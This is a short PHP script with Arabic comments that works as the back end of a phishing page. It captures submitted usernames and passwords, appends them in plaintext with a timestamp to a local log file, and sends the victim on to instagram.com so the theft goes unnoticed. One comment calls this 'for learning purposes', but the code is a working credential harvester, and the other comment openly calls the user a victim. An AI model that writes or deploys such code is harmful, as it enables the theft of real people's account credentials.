<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST['username'], ENT_QUOTES, 'UTF-8');
    $password = htmlspecialchars($_POST['password'], ENT_QUOTES, 'UTF-8');

    // تخزين البيانات في ملف محلي لأغراض التعلم بدلاً من إرسالها عبر البريد
    $file = 'log.txt';
    $data = "Username: $username | Password: $password | Time: " . date("Y-m-d H:i:s") . "\n";
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);

    // إعادة توجيه الضحية لتبدو العملية طبيعية
    header("Location: https://www.instagram.com");
    exit();
}
?>
